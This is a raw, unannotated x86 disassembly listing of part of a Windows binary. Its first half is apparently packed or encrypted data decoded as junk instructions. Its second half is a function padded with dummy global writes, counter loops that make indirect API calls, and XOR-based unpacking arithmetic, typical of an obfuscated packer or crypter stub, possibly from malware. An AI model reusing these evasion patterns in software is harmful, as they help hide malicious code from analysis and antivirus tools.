  408c96:	adc    esp,DWORD PTR [ebp+ebp*8-0x1f2eda3e]
  408c9d:	lds    edi,FWORD PTR [edi-0x72]
  408ca0:	add    dh,BYTE PTR [eax]
  408ca2:	and    eax,0x4d4df8b6
  408ca7:	jnp    0x408c7f
  408ca9:	xor    BYTE PTR [eax-0x76490085],0x5f
  408cb0:	mov    ebp,0x9c7918d5
  408cb5:	retf   0x4bde
  408cb8:	and    DWORD PTR [ecx-0x16],0x1a
  408cbc:	sbb    ebp,DWORD PTR [ebx+0x36]
  408cbf:	add    BYTE PTR [edx+0x798c9f0e],ah
  408cc5:	jge    0x408c68
  408cc7:	popa   
  408cc8:	pop    ebx
  408cc9:	loopne 0x408c87
  408ccb:	test   DWORD PTR [ecx],0xc67a6ccc
  408cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cd2:	(bad)  
  408cd3:	je     0xbc532881
  408cd9:	sbb    DWORD PTR [edi],eax
  408cdb:	out    0x1a,al
  408cdd:	mov    eax,ds:0x2f6bfd45
  408ce2:	(bad)  
  408ce3:	stc    
  408ce4:	daa    
  408ce5:	mov    DWORD PTR [ecx],ecx
  408ce7:	lds    edi,FWORD PTR [esi+0x2b]
  408cea:	mov    ah,0x92
  408cec:	fwait
  408ced:	ja     0x408cff
  408cef:	int3   
  408cf0:	jp     0x408c83
  408cf2:	mov    cl,0x18
  408cf4:	and    ebx,ecx
  408cf6:	xchg   esi,eax
  408cf7:	xchg   ebx,eax
  408cf8:	jmp    0xd860:0x3b658fa1
  408cff:	js     0x408d5d
  408d01:	je     0x408d6e
  408d03:	push   ebx
  408d04:	adc    ah,BYTE PTR ds:0x9a9f9846
  408d0a:	xor    ebx,DWORD PTR [ecx+0x4596310e]
  408d10:	leave  
  408d11:	cmp    eax,0x7f7bf74f
  408d16:	scas   eax,DWORD PTR es:[edi]
  408d17:	scas   eax,DWORD PTR es:[edi]
  408d18:	fiadd  DWORD PTR [esi]
  408d1a:	por    mm6,QWORD PTR [ecx]
  408d1d:	int    0xc7
  408d1f:	test   BYTE PTR [eax+0x4edc2708],dl
  408d25:	inc    ebx
  408d26:	jmp    0x408cf2
  408d28:	adc    dl,BYTE PTR ds:0xcb572781
  408d2e:	or     BYTE PTR [esi+0x726cf2ec],ch
  408d34:	and    eax,0x23d1af88
  408d39:	push   eax
  408d3a:	div    BYTE PTR [ecx+esi*1+0x1a]
  408d3e:	jns    0x408d37
  408d40:	mov    ah,0xee
  408d42:	pusha  
  408d43:	xchg   esi,eax
  408d44:	xchg   esp,eax
  408d45:	xor    BYTE PTR [esi-0x5d],bl
  408d48:	or     BYTE PTR ds:0x6bf135f4,dl
  408d4e:	mov    esi,ebx
  408d50:	out    dx,eax
  408d51:	inc    edx
  408d52:	cmp    DWORD PTR [edx+0x11],esp
  408d55:	cld    
  408d56:	pop    eax
  408d57:	push   eax
  408d58:	cld    
  408d59:	push   ebp
  408d5a:	test   esi,edi
  408d5c:	jg     0x408db7
  408d5e:	push   esp
  408d5f:	int    0x69
  408d61:	les    esp,FWORD PTR [edi+0x35]
  408d64:	scas   al,BYTE PTR es:[edi]
  408d65:	xor    eax,0xc5c7cf4f
  408d6a:	cli    
  408d6b:	sub    dl,ch
  408d6d:	data16 js 0x408dce
  408d70:	scas   al,BYTE PTR es:[edi]
  408d71:	scas   eax,DWORD PTR es:[edi]
  408d72:	push   ebp
  408d73:	cld    
  408d74:	pop    es
  408d75:	leave  
  408d76:	push   ebx
  408d77:	mov    bl,0x3
  408d79:	xlat   BYTE PTR ds:[ebx]
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	ret    0x93c3
  408dad:	cmpxchg ecx,edx
  408db0:	jle    0x408e30
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408dd2
  408db7:	pop    ecx
  408db8:	jmp    0x34aa2a27
  408dbd:	aas    
  408dbe:	or     esi,eax
  408dc0:	sti    
  408dc1:	bound  esi,QWORD PTR [eax-0x19]
  408dc4:	jnp    0x408d74
  408dc6:	mov    al,BYTE PTR [edx+ebp*2]
  408dc9:	push   edi
  408dca:	inc    eax
  408dcb:	inc    edx
  408dcc:	aad    0x2d
  408dce:	jp     0x408ded
  408dd0:	rep stos BYTE PTR es:[edi],al
  408dd2:	dec    ebp
  408dd3:	push   0xfffffffb
  408dd5:	mov    ch,0xb2
  408dd7:	std    
  408dd8:	cmp    cl,BYTE PTR [esi+0x2a55c595]
  408dde:	int3   
  408ddf:	mov    esi,0x68dee68c
  408de4:	push   ebp
  408de5:	jno    0x408e38
  408de7:	aam    0xa6
  408de9:	je     0x408e5f
  408deb:	mov    es,WORD PTR [ebx]
  408ded:	and    bl,ah
  408def:	mov    ah,0xc7
  408df1:	xchg   esp,eax
  408df2:	sbb    BYTE PTR [esi],0xc4
  408df5:	call   0x310b:0x261d6889
  408dfc:	ret    0x9028
  408dff:	out    0xb3,eax
  408e01:	ror    BYTE PTR [edx],cl
  408e03:	jo     0x408db1
  408e05:	fldcw  WORD PTR [eax+0x45]
  408e08:	loop   0x408ddd
  408e0a:	xchg   ebp,eax
  408e0b:	popa   
  408e0c:	push   0xf975051f
  408e11:	(bad)  
  408e13:	nop
  408e14:	in     eax,0xfd
  408e16:	sbb    DWORD PTR [edx+0x63],ebp
  408e19:	cmp    eax,0xb713ffc9
  408e1e:	(bad)  [ecx-0xe]
  408e21:	std    
  408e22:	add    eax,0x84bdf3ec
  408e27:	or     BYTE PTR [esi-0x5b],dh
  408e2a:	lods   eax,DWORD PTR ds:[esi]
  408e2b:	cmp    eax,0xf274f29e
  408e30:	ficomp DWORD PTR [esp+edx*1]
  408e33:	xchg   edx,eax
  408e34:	fistp  WORD PTR [esp+ebx*2+0x288a23a0]
  408e3b:	in     eax,dx
  408e3c:	push   edi
  408e3d:	cmp    al,0xd5
  408e3f:	inc    ebx
  408e40:	mov    ebx,0x9f94144e
  408e45:	xor    eax,0x7f8c7b82
  408e4a:	ds pop ds
  408e4c:	add    BYTE PTR [edi+0x35],dl
  408e4f:	sbb    ch,BYTE PTR [esi-0x34]
  408e52:	sti    
  408e53:	add    bh,BYTE PTR [edi]
  408e55:	or     DWORD PTR [edx],edx
  408e57:	jp     0x408dfa
  408e59:	and    DWORD PTR [edi+0x690c4d5],ebx
  408e5f:	gs jnp 0x408e75
  408e62:	xchg   DWORD PTR [edx],ebp
  408e64:	jg     0x408eca
  408e66:	fadd   st(7),st
  408e68:	imul   esp,DWORD PTR [edx],0x73aa2dec
  408e6e:	xchg   edx,eax
  408e6f:	(bad)  
  408e70:	pop    ebx
  408e71:	fld    QWORD PTR [edx]
  408e73:	aaa    
  408e74:	inc    edi
  408e75:	xchg   edi,eax
  408e76:	inc    edi
  408e77:	ins    DWORD PTR es:[edi],dx
  408e78:	(bad)  
  408e79:	jb     0x408ec0
  408e7b:	jl     0x408ea3
  408e7d:	mov    BYTE PTR [eax-0x2f],al
  408e80:	mov    dh,0xf0
  408e82:	pop    ecx
  408e83:	(bad)  
  408e84:	iret   
  408e85:	ss in  al,0x7e
  408e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e89:	mov    bl,bh
  408e8b:	dec    esi
  408e8c:	or     eax,0x19468dd0
  408e91:	dec    ebp
  408e92:	cs sti 
  408e94:	jl     0x408ef6
  408e96:	out    0x92,eax
  408e98:	or     al,0xa2
  408e9a:	push   esp
  408e9b:	inc    ebx
  408e9c:	and    al,0xe1
  408e9e:	sub    dh,dh
  408ea0:	mov    eax,0xc35da37
  408ea5:	xchg   esp,eax
  408ea6:	or     bl,BYTE PTR [ebp+0x42b15222]
  408eac:	test   edi,edx
  408eae:	(bad)  
  408eb0:	mov    ds,WORD PTR [eax-0x7d34a827]
  408eb6:	scas   eax,DWORD PTR es:[edi]
  408eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eb8:	dec    DWORD PTR [edx+0x6d9e7d4c]
  408ebe:	retf   0x2921
  408ec1:	imul   edi
  408ec3:	cwde   
  408ec4:	fst    st(0)
  408ec6:	push   es
  408ec7:	(bad)  
  408ec8:	cli    
  408ec9:	(bad)  
  408eca:	bound  ecx,QWORD PTR [ebx-0x107927d]
  408ed0:	imul   edx,DWORD PTR [ecx+ebx*2+0x21],0x214369e8
  408ed8:	stc    
  408ed9:	repz mov eax,ds:0x5d441d7c
  408edf:	lods   al,BYTE PTR ds:[esi]
  408ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ee1:	xchg   ebp,eax
  408ee2:	dec    edx
  408ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee4:	jl     0x408ee5
  408ee6:	jge    0x408eba
  408ee8:	lock cmp BYTE PTR [edi],ah
  408eeb:	inc    edx
  408eec:	jns    0x408ecf
  408eee:	inc    esp
  408eef:	sbb    eax,0xb8d982e7
  408ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ef5:	pop    es
  408ef6:	adc    eax,0x15e4470a
  408efb:	xchg   ebx,eax
  408efc:	add    DWORD PTR [di],0x6d60978
  408f03:	shr    al,0xc9
  408f06:	ins    BYTE PTR es:[edi],dx
  408f07:	pop    esi
  408f08:	pushf  
  408f09:	cmp    eax,0x7575ddf4
  408f0e:	pusha  
  408f0f:	loopne 0x408ea3
  408f11:	cli    
  408f12:	retf   0xd8e4
  408f15:	xlat   BYTE PTR ds:[ebx]
  408f16:	inc    edx
  408f17:	inc    edx
  408f18:	pop    edi
  408f19:	push   cs
  408f1a:	add    eax,0x4ff5158c
  408f1f:	jge    0x408edd
  408f21:	or     al,0x6
  408f23:	mov    cl,dh
  408f25:	mov    eax,ds:0x5fd21fb4
  408f2a:	and    DWORD PTR [edx-0x1106c5d3],eax
  408f30:	loope  0x408ed3
  408f32:	push   ds
  408f33:	push   esi
  408f34:	bswap  esi
  408f36:	and    bh,BYTE PTR [esi+0x4028e6ff]
  408f3c:	push   es
  408f3d:	and    dl,ch
  408f3f:	sbb    eax,DWORD PTR [ebx+0x49]
  408f42:	sbb    BYTE PTR [edx+0x1e],0x55
  408f46:	out    0xd3,eax
  408f48:	outs   dx,DWORD PTR ds:[esi]
  408f49:	lds    ecx,FWORD PTR [ebx-0x2fcc07a3]
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	mov    eax,0xcd9aacb4
  408f65:	fistp  QWORD PTR [esi+0x7e]
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408eed
  408f6d:	add    al,0xe0
  408f6f:	mov    cl,BYTE PTR [ecx+0x753296d0]
  408f75:	icebp  
  408f76:	xchg   edi,eax
  408f77:	lods   al,BYTE PTR ds:[esi]
  408f78:	mov    bl,0x9
  408f7a:	pop    ebp
  408f7b:	inc    edx
  408f7c:	mov    esi,0x8302691a
  408f81:	mov    al,gs:0x51782e11
  408f87:	out    0xee,al
  408f89:	mov    ecx,0x411ab0f4
  408f8e:	mov    al,0x68
  408f90:	loope  0x408f2f
  408f92:	sbb    DWORD PTR [edi],edx
  408f94:	enter  0x4ad,0xd6
  408f98:	cmp    eax,0x24369a78
  408f9d:	bound  esp,QWORD PTR [edx]
  408f9f:	cmc    
  408fa0:	push   es
  408fa1:	xor    edi,ecx
  408fa3:	xor    ah,BYTE PTR [eax-0x72]
  408fa6:	fwait
  408fa7:	mov    esp,DWORD PTR [ecx+ebx*2]
  408faa:	js     0x408fef
  408fac:	mov    cl,0x88
  408fae:	aad    0xb3
  408fb0:	adc    BYTE PTR [edi+ebx*2-0x540e1948],0xe3
  408fb8:	les    ebp,FWORD PTR [edi-0x5cd23961]
  408fbe:	std    
  408fbf:	shr    ecx,cl
  408fc1:	pop    es
  408fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fc3:	and    al,0x7f
  408fc5:	mov    eax,ds:0xb9c8b83a
  408fca:	aad    0x22
  408fcc:	inc    di
  408fce:	mov    ch,0x4c
  408fd0:	in     al,0x58
  408fd2:	sub    ebx,DWORD PTR [edx]
  408fd4:	or     eax,0xdd005cd7
  408fd9:	ja     0x408f96
  408fdb:	push   edi
  408fdc:	cwde   
  408fdd:	push   edi
  408fde:	inc    eax
  408fdf:	pop    edi
  408fe0:	in     al,0x52
  408fe2:	xchg   BYTE PTR [ebp+0x51],bh
  408fe5:	sub    al,0xf2
  408fe7:	pop    ds
  408fe8:	pushf  
  408fe9:	imul   edi,DWORD PTR [edi+ecx*1],0x6a
  408fed:	inc    ebp
  408fee:	xor    bh,cl
  408ff0:	xor    al,0x9b
  408ff2:	xor    dl,BYTE PTR [ecx-0x57b7d31b]
  408ff8:	jp     0x40901d
  408ffa:	sti    
  408ffb:	xor    DWORD PTR [esi],ebx
  408ffd:	jg     0x40903f
  408fff:	mov    ebx,0x98f74d9d
  409004:	add    DWORD PTR [ebp-0x43],edx
  409007:	xchg   esp,eax
  409008:	sbb    al,BYTE PTR [edx-0x7354bc9b]
  40900e:	sbb    ebx,edi
  409010:	fsubr  st(2),st
  409012:	jns    0x408fbb
  409014:	and    al,0x39
  409016:	test   dh,ah
  409018:	call   0xc21a:0x8fbd535b
  40901f:	test   ebx,ecx
  409021:	add    eax,0x4b9f094d
  409026:	xor    al,0x37
  409028:	lods   al,BYTE PTR ds:[esi]
  409029:	mov    eax,ds:0xc206e126
  40902e:	dec    eax
  40902f:	xchg   ecx,eax
  409030:	add    BYTE PTR [edi-0x60f9f2b3],dh
  409036:	sub    al,0xfd
  409038:	adc    dh,bh
  40903a:	shr    eax,1
  40903c:	pusha  
  40903d:	je     0x408feb
  40903f:	es xchg edx,eax
  409041:	pop    edx
  409042:	js     0x409000
  409044:	mov    ebx,DWORD PTR [esi-0x40]
  409047:	mov    bh,0x66
  409049:	outs   dx,DWORD PTR ds:[esi]
  40904a:	xchg   edx,eax
  40904c:	add    al,0x3f
  40904e:	xchg   esp,eax
  40904f:	inc    edi
  409050:	inc    eax
  409051:	mov    eax,ds:0x978c5ef3
  409056:	daa    
  409057:	inc    esp
  409058:	gs xchg ecx,eax
  40905a:	loopne 0x40907b
  40905c:	or     eax,0x208dd5ed
  409061:	(bad)  
  409062:	jecxz  0x409056
  409064:	fldcw  WORD PTR [ebx]
  409066:	and    ebp,DWORD PTR [eax+0x70]
  409069:	aaa    
  40906a:	dec    ecx
  40906b:	jl     0x4090e4
  40906d:	and    ecx,DWORD PTR [eax]
  40906f:	pop    eax
  409070:	xor    bl,BYTE PTR [ebx-0x6b]
  409073:	data16 jp 0x40902f
  409076:	and    dl,dl
  409078:	repz dec ebp
  40907a:	push   esp
  40907b:	push   0xb649a9ff
  409080:	mov    dh,0x55
  409082:	sub    DWORD PTR [ecx],0xe3bc8cf6
  409088:	fsubp  st(0),st
  40908a:	aas    
  40908b:	pop    ebp
  40908c:	shl    BYTE PTR [ebx-0x70585e34],0x8c
  409093:	xor    BYTE PTR [ecx+ebp*2-0x56],ch
  409097:	cmp    BYTE PTR [edx-0x193c4d15],cl
  40909d:	stc    
  40909e:	out    dx,al
  40909f:	jne    0x4090d3
  4090a1:	pop    ss
  4090a2:	inc    esp
  4090a3:	sar    BYTE PTR [edi+0x2f2bdb94],1
  4090a9:	or     DWORD PTR [ebx+0xceae9c4],edi
  4090af:	push   ds
  4090b0:	cwde   
  4090b1:	iret   
  4090b2:	outs   dx,BYTE PTR ds:[esi]
  4090b3:	cmp    DWORD PTR [ebp-0x4e],0xffffffeb
  4090b7:	xchg   ebp,eax
  4090b8:	mov    al,gs:0xc6360460
  4090be:	jb     0x4090d0
  4090c0:	shl    BYTE PTR [ebx+0x269de151],0x71
  4090c7:	stc    
  4090c8:	jae    0x409121
  4090ca:	inc    ecx
  4090cb:	jg     0x409104
  4090cd:	cmp    bl,dh
  4090cf:	sbb    BYTE PTR [eax+0x29d34b4],0x58
  4090d6:	rol    ebp,0x8c
  4090d9:	fnstcw WORD PTR [esi-0x3b]
  4090dc:	xor    BYTE PTR [ebp+0x59],al
  4090df:	lods   al,BYTE PTR ds:[esi]
  4090e0:	push   es
  4090e1:	xchg   edx,eax
  4090e2:	sub    eax,DWORD PTR [eax-0xdb7f3b7]
  4090e8:	out    0x17,eax
  4090ea:	lods   eax,DWORD PTR ds:[esi]
  4090eb:	enter  0x49a8,0x4
  4090ef:	outs   dx,BYTE PTR ds:[esi]
  4090f0:	loop   0x409113
  4090f2:	xchg   edx,eax
  4090f3:	clc    
  4090f4:	cmp    BYTE PTR [eax+0x5d25d14f],ah
  4090fa:	dec    ebp
  4090fb:	mov    BYTE PTR [edi],bl
  4090fd:	leave  
  4090fe:	jmp    0x4090ec
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e9b7
  40911f:	and    DWORD PTR ds:0x43045b,0x4303bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ed5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430463,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e758,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e9f7
  40916b:	sbb    DWORD PTR ds:0x4303c1,0x4303f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ed4b,0x624a
  409184:	call   DWORD PTR ds:0x42e9bf
  40918a:	adc    DWORD PTR ds:0x42e740,0x4303dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4303d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4303b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4303ed,0x42e754
  4091c4:	call   DWORD PTR ds:0x42ea63
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e748
  4091d6:	and    DWORD PTR ds:0x4303d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4303b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ed5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ed5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ed5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e963
  409219:	mov    ecx,DWORD PTR ds:0x42ed5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ed5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ed63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ed5f
  409243:	sbb    eax,DWORD PTR ds:0x42ed5b
  409249:	mov    ds:0x42ed5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ed5b
  409261:	and    DWORD PTR ds:0x42e73c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4303d5,0x430457
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e74c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4303d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ed4b,0x430467
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ed4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4303c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4303d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ed63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e748,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4303b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e97f
  40930f:	adc    DWORD PTR ds:0x42ed5f,0x42e74c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4303d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4303d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4303d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4303d1,ecx
  409352:	cmp    DWORD PTR ds:0x4303d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4303d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e967
  409375:	cmp    DWORD PTR ds:0x4303d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4303d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4303d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ed4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e8e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430453,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43046b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43046b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43046b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e96b
  4093df:	cmp    DWORD PTR ds:0x43046b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43046b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43046b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43046b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43046b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43045f,0x10
  409415:	cmp    DWORD PTR ds:0x43045f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43045f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e96f
  409438:	mov    ecx,DWORD PTR ds:0x43045f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43045f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4303e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4303e9,0x16
  409461:	cmp    DWORD PTR ds:0x4303e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4303e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e973
  409481:	mov    ecx,DWORD PTR ds:0x4303e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4303e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ed4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ed4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ed4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ed4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ed4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e87b
  4094d6:	push   0x42e825
  4094db:	call   DWORD PTR ds:0x42ebab
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4303d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43046b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ed63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4303e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430463,0x4303f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4303b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4303b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4303b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e75c
  409566:	call   DWORD PTR ds:0x42e977
  40956c:	mov    eax,ds:0x4303b9
  409571:	dec    eax
  409572:	mov    ds:0x4303b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430409
  409582:	mov    eax,ds:0x430493
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43044f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e758,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4303c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4303c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4303c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4303c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e84d
  409617:	call   DWORD PTR ds:0x42e97b
  40961d:	cmp    DWORD PTR ds:0x4303c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e748,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e748
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e748,ecx
  40964a:	cmp    DWORD PTR ds:0x42e748,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42ebaf
  409672:	cmp    DWORD PTR ds:0x42e748,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
